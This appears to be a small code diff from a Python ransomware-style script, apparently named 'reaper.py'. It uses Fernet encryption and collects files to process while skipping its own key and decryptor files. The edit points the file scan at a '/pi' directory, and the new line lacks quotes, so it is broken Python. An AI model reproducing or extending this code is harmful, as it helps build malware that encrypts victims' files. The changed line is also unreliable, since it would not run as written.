@@ -6,7 +6,7 @@ from cryptography.fernet import Fernet
 
 files = []
 
-for file in os.listdir():
+for file in os.listdir(/pi):
 	if file=="reaper.py" or file == "key.key" or file=="reaperdecryptor.py":
 		continue
 	if os.path.isfile(file):
